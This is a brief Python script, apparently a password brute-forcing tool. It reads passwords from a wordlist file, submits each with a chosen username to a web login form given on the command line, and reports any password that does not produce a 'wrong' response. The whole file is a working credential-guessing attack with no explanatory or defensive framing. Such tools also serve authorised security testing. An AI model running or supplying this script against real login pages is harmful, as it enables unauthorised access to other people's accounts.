import requests
import sys

for p in open(sys.argv[3]):
    r = requests.post(sys.argv[1], data={'user': sys.argv[2], 'pass': p.strip()})
    if 'wrong' not in r.text.lower():
        print(f'[!] Success: {p.strip()}')
